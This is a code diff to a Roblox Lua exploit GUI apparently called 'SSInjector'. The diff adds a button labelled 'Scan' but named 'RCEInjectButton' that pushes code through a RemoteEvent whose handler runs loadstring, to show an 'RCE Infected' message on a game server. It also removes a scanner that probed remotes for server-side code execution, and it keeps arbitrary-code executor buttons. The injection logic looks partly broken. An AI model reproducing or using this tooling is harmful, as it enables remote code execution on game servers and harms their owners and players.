@@ -18,7 +18,7 @@ local ServerCoder = Instance.new("TextBox")
 local Execute_2 = Instance.new("TextButton")
 local ServerLibrary = Instance.new("TextButton")
 local Clear_2 = Instance.new("TextButton")
-local Scan = Instance.new("TextButton")
+local RCEInjectButton = Instance.new("TextButton")
 local ToggleButton = Instance.new("ImageButton")
 
 --Properties:
@@ -189,17 +189,33 @@ Clear_2.Text = "Clear"
 Clear_2.TextColor3 = Color3.fromRGB(0, 0, 0)
 Clear_2.TextSize = 30.000
 
-Scan.Name = "Scan"
-Scan.Parent = Server
-Scan.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-Scan.BorderColor3 = Color3.fromRGB(0, 0, 0)
-Scan.BorderSizePixel = 2
-Scan.Position = UDim2.new(0.782208562, 0, 0.764356196, 0)
-Scan.Size = UDim2.new(0, 135, 0, 67)
-Scan.Font = Enum.Font.SourceSans
-Scan.Text = "Scan"
-Scan.TextColor3 = Color3.fromRGB(0, 0, 0)
-Scan.TextSize = 30.000
+RCEInjectButton.Name = "RCEInjectButton"
+RCEInjectButton.Parent = Server
+RCEInjectButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+RCEInjectButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
+RCEInjectButton.BorderSizePixel = 2
+RCEInjectButton.Position = UDim2.new(0.782208562, 0, 0.764356196, 0)
+RCEInjectButton.Size = UDim2.new(0, 135, 0, 67)
+RCEInjectButton.Font = Enum.Font.SourceSans
+RCEInjectButton.Text = "Scan"
+RCEInjectButton.TextColor3 = Color3.fromRGB(0, 0, 0)
+RCEInjectButton.TextSize = 30.000
+RCEInjectButton.MouseButton1Click:Connect(function()
+		local RCEremote = game.ReplicatedStorage:FindFirstChild("RemoteEvent")
+		if RCEremote then
+			print("RCE Found")
+		elseif not RCEremote then
+			local server = Instance.new("RemoteEvent",game.ReplicatedStorage)
+			server.OnServerEvent:connect(function(player,SS)
+				loadstring(SS)()
+			end)
+		end
+		RCEremote:FireServer([[
+            local mes = Instance.new("Hint", game.workspace)
+            mes.Text = "Server got RCE Infected by Floppa Ultimate"
+            task.delay(4, function() mes:Destroy() end)
+        ]])
+end)
 
 ToggleButton.Name = "ToggleButton"
 ToggleButton.Parent = SSInjector
@@ -209,23 +225,23 @@ ToggleButton.BorderSizePixel = 0
 ToggleButton.Position = UDim2.new(0.0868544579, 0, 0.414179116, 0)
 ToggleButton.Size = UDim2.new(0, 100, 0, 50)
 ToggleButton.Image = "rbxassetid://93101151251105"
-ToggleButton.MouseButton1Click:Connect(function()
-	local fr = Main
-	fr.Visible = not fr.Visible
-end)
 ToggleButton.Draggable = true
 ToggleButton.Active = true
+ToggleButton.MouseButton1Click:Connect(function()
+	Main.Visible = not Main.Visible
+end)
+
 -- Scripts:
 
-local function RRVOO_fake_script() -- Main.LocalScript 
+local function ENMM_fake_script() -- Main.LocalScript 
 	local script = Instance.new('LocalScript', Main)
 
 	ClientMenu = script.Parent
 	ClientMenu.Active = true
 	ClientMenu.Draggable = true
 end
-coroutine.wrap(RRVOO_fake_script)()
-local function LHYFYI_fake_script() -- Execute.LocalScript 
+coroutine.wrap(ENMM_fake_script)()
+local function VEGL_fake_script() -- Execute.LocalScript 
 	local script = Instance.new('LocalScript', Execute)
 
 	local exec = script.Parent
@@ -234,8 +250,8 @@ local function LHYFYI_fake_script() -- Execute.LocalScript
 		loadstring(codeloader.Text)()
 	end)
 end
-coroutine.wrap(LHYFYI_fake_script)()
-local function DIAHU_fake_script() -- ClientLibrary.LocalScript 
+coroutine.wrap(VEGL_fake_script)()
+local function KVPJPI_fake_script() -- ClientLibrary.LocalScript 
 	local script = Instance.new('LocalScript', ClientLibrary)
 
 	local lib = script.Parent
@@ -487,8 +503,8 @@ local function DIAHU_fake_script() -- ClientLibrary.LocalScript
 	
 	end)
 end
-coroutine.wrap(DIAHU_fake_script)()
-local function CEKZE_fake_script() -- Clear.LocalScript 
+coroutine.wrap(KVPJPI_fake_script)()
+local function CEKCF_fake_script() -- Clear.LocalScript 
 	local script = Instance.new('LocalScript', Clear)
 
 	local clear = script.Parent
@@ -497,8 +513,8 @@ local function CEKZE_fake_script() -- Clear.LocalScript
 		coder.Text = ""
 	end)
 end
-coroutine.wrap(CEKZE_fake_script)()
-local function FTVBRE_fake_script() -- ClientButton.ClientPageScript 
+coroutine.wrap(CEKCF_fake_script)()
+local function VRSITMJ_fake_script() -- ClientButton.ClientPageScript 
 	local script = Instance.new('LocalScript', ClientButton)
 
 	local client = script.Parent.Parent.Client
@@ -508,8 +524,8 @@ local function FTVBRE_fake_script() -- ClientButton.ClientPageScript
 		server.Visible = false
 	end)
 end
-coroutine.wrap(FTVBRE_fake_script)()
-local function FJCVK_fake_script() -- ServerButton.ServerPageScript 
+coroutine.wrap(VRSITMJ_fake_script)()
+local function FYSXV_fake_script() -- ServerButton.ServerPageScript 
 	local script = Instance.new('LocalScript', ServerButton)
 
 	local Client = script.Parent.Parent.Client
@@ -519,8 +535,8 @@ local function FJCVK_fake_script() -- ServerButton.ServerPageScript
 		Server.Visible = true
 	end)
 end
-coroutine.wrap(FJCVK_fake_script)()
-local function QRCJQE_fake_script() -- Execute_2.LocalScript 
+coroutine.wrap(FYSXV_fake_script)()
+local function EFDXLFN_fake_script() -- Execute_2.LocalScript 
 	local script = Instance.new('LocalScript', Execute_2)
 
 	local textBox = script.Parent.Parent.ServerCoder 
@@ -541,8 +557,8 @@ local function QRCJQE_fake_script() -- Execute_2.LocalScript
 	end)
 	
 end
-coroutine.wrap(QRCJQE_fake_script)()
-local function QXDJYS_fake_script() -- ServerLibrary.LocalScript 
+coroutine.wrap(EFDXLFN_fake_script)()
+local function IZNPI_fake_script() -- ServerLibrary.LocalScript 
 	local script = Instance.new('LocalScript', ServerLibrary)
 
 	local lib = script.Parent
@@ -794,8 +810,8 @@ local function QXDJYS_fake_script() -- ServerLibrary.LocalScript
 	
 	end)
 end
-coroutine.wrap(QXDJYS_fake_script)()
-local function DPYU_fake_script() -- Clear_2.LocalScript 
+coroutine.wrap(IZNPI_fake_script)()
+local function NWTE_fake_script() -- Clear_2.LocalScript 
 	local script = Instance.new('LocalScript', Clear_2)
 
 	local clear = script.Parent
@@ -804,34 +820,4 @@ local function DPYU_fake_script() -- Clear_2.LocalScript
 		servercoder.Text = ""
 	end)
 end
-coroutine.wrap(DPYU_fake_script)()
-local function SIJQMTG_fake_script() -- Scan.LocalScript 
-	local script = Instance.new('LocalScript', Scan)
-
-	script.Parent.MouseButton1Click:Connect(function()
-		local function testRemote(remote, isFunction, timeout)
-			-- Создает тестовый объект и проверяет, был ли он создан на сервере
-			local modelName = "starlight_"..tostring(math.random(1,999999))
-			local payload = [[
-		        local m=Instance.new("ObjectValue")
-		        m.Name="]]..modelName..[["
-		        m.Parent=game:GetService("ReplicatedStorage")
-		    ]]
-	
-			-- Пытается выполнить код через remote
-			if isFunction then
-				remote:InvokeServer(payload .. "\nreturn true")
-			else
-				remote:FireServer(payload)
-			end
-	
-			-- Проверяет, был ли создан объект
-			if rs:FindFirstChild(modelName) then
-				return true -- Уязвимость найдена
-			end
-			return false
-		end
-	end)
-	
-end
-coroutine.wrap(SIJQMTG_fake_script)()
+coroutine.wrap(NWTE_fake_script)()
